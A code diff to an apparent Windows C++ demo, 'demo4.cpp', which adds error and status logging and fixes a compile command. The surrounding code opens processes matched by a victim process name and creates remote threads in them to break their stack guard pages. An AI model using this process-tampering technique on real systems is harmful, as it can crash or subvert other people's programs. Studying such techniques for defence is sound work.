@@ -1,5 +1,5 @@
 // Compile command:
-// cl.exe /Ox /EHsc demo4.cpp /lib Shlwapi.lib
+// cl.exe /Ox /EHsc demo4.cpp Shlwapi.lib
 
 #define UNICODE
 
@@ -126,7 +126,10 @@ static void BreakStackGuardPage(HANDLE hProcess, DWORD_PTR stackLimit)
         &remoteThreadId
     );
     if (hRemoteThread == NULL)
+    {
+        printf("Failed to create remote thread\n");
         return;
+    }
 
     WaitForSingleObject(hRemoteThread, 10000);
 }
@@ -179,8 +182,13 @@ static void BrakeStackGuardPages(const char victimProcessName[])
                 processID
             );
 
-            if (hProcess == NULL)
+            if (hProcess == NULL) {
+                printf("Failed open process id = %x\n", processID);
                 continue;
+            }
+            else {
+                printf("Opened process id = %x\n", processID);
+            }
 
             DWORD nSize = sizeof(szProcessName)/sizeof(szProcessName[0]);
             if (GetModuleFileNameExA(hProcess, NULL, szProcessName, nSize) == 0)
